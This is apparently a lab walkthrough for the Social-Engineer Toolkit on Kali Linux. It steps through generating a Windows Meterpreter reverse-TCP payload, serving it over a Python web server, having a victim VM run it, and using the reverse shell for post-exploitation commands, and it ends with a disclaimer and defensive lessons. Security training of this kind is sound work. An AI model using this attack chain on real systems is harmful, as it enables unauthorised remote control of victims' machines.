# Hands-on: Social Engineering Toolkit (SET)

A step-by-step lab demonstrating how to use the **Social-Engineer Toolkit (SET)** on Kali Linux to generate a Windows payload, host it, and receive a **Meterpreter** session through **Metasploit**, between an attacker VM and a victim VM.

> ⚠️ **For authorised training and educational use only.** Everything below is performed in an isolated lab between virtual machines you own. Deploying payloads against systems you do not own or lack explicit written permission to test is illegal.

## Lab Environment

| Role | Machine | IP (example) |
| --- | --- | --- |
| Attacker | Kali Linux (VMware) | `192.168.40.129` |
| Victim | Windows 10 x64 (VMware) | `192.168.40.131` |

## Prerequisites

- Kali Linux with SET and Metasploit installed
- A Windows VM on the same host-only / NAT network
- Both machines able to reach each other (verify with `ping`)

---

## 1. Launching SET

Open the Kali application menu, search for `set`, and select **social engineering toolkit (root)**.

<img width="803" height="699" alt="image" src="https://github.com/user-attachments/assets/a7826b8e-8db4-4548-b432-f3a781a0b458" />


SET loads and shows its banner and main menu. Type a number to select an option — start with **option 1 (Social-Engineering Attacks)**.

<img width="534" height="549" alt="image" src="https://github.com/user-attachments/assets/86f3777d-ed3e-4799-b1d8-cdda7e299c10" />


## 2. Selecting the Attack Vector

From the Social-Engineering Attacks menu, choose **option 4 (Create a Payload and Listener)**.

<img width="741" height="699" alt="image" src="https://github.com/user-attachments/assets/994763c7-1c15-483d-9488-d4b9c5aacbec" />

SET lists the available payloads. Choose one — for example **option 5 (Windows Meterpreter Reverse_TCP X64)** — then, when prompted for `LHOST`, enter the attacker's IP address.

```text
set:payloads> 5
set:payloads> IP address for the payload listener (LHOST): 192.168.40.129
```

<img width="956" height="699" alt="image" src="https://github.com/user-attachments/assets/9aaa0575-d450-49f0-a78a-3222b9b29017" />

Enter a port for the reverse listener (a random port, for example `1001`). SET generates the payload and exports it to the default SET directory. Listing the directory confirms `payload.exe` is present.

```text
set:payloads> Enter the PORT for the reverse listener: 1001
[*] Payload has been exported to the default SET directory located under: /root/.set/payload.exe
```

<img width="922" height="672" alt="image" src="https://github.com/user-attachments/assets/16868655-8ed2-4b90-8bcd-e241908decda" />


## 4. Hosting the Payload

Set up a simple web server from the SET directory so the victim can download the payload:

```bash
cd /root/.set
python3 -m http.server 80
```

<img width="807" height="248" alt="image" src="https://github.com/user-attachments/assets/ff07a75e-4f88-4572-9c2c-6dcf9864450a" />


Type `yes` to start the payload and listener. Metasploit launches and configures the `multi/handler` with the matching payload, `LHOST`, and `LPORT`; the handler then waits for a connection from the victim machine.

<img width="923" height="672" alt="image" src="https://github.com/user-attachments/assets/86e69398-884a-4d7b-9c20-106f641a478c" />
<img width="864" height="670" alt="image" src="https://github.com/user-attachments/assets/56d37e98-d2f6-4fc4-9ff8-fe4e8c775ff9" />


## 5. The Victim Downloads the Payload

Switch to the victim machine. In its browser, enter the attacker's IP address to reach the hosted directory listing, then download `payload.exe` — representing the victim clicking a malicious link.

<img width="931" height="286" alt="image" src="https://github.com/user-attachments/assets/2559ab47-5ce4-49b2-8c9b-13a7471e99b8" /> <img width="1026" height="476" alt="image" src="https://github.com/user-attachments/assets/a81e1ace-13ef-49be-8d52-a34ea41170be" />



## 6. Receiving the Meterpreter Session

When the payload runs, the handler receives the connection and a **Meterpreter session** opens.

<img width="956" height="689" alt="image" src="https://github.com/user-attachments/assets/19ad7373-36d2-427f-9f29-7fb27eaaa9b2" />


Several sessions may open, but only one is needed. Interact with a session using:

```text
sessions -i 1
```

<img width="948" height="530" alt="image" src="https://github.com/user-attachments/assets/b5d5b243-628d-48c0-8f12-2179a9da098d" />


## 7. Post-Exploitation

With the session established, commands can be run on the victim machine. Use `sysinfo` to learn the OS and system details:

```text
meterpreter > sysinfo
Computer        : DESKTOP-VO5Q4NI
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

<img width="987" height="477" alt="image" src="https://github.com/user-attachments/assets/adbd6774-db97-4ca9-a04c-5368a2483ac6" />


Drop into a native shell to run standard Windows commands, for example listing the Downloads folder:

```text
meterpreter > shell
C:\Users\freef\Downloads> dir
```

<img width="833" height="805" alt="image" src="https://github.com/user-attachments/assets/e29bd56b-f281-47fc-a74a-e61e7682ef58" />


---

## Key Takeaways

- SET automates payload creation and listener setup, lowering the barrier to a working attack chain.
- Delivery still relies on **social engineering** — the victim has to be persuaded to download and run the file.
- Defensive lessons: don't run untrusted executables, watch for unexpected outbound connections, and use endpoint protection and network monitoring.

## Disclaimer

This material is provided strictly for learning and authorised testing. The author accepts no liability for misuse. Always obtain explicit permission before testing any system.
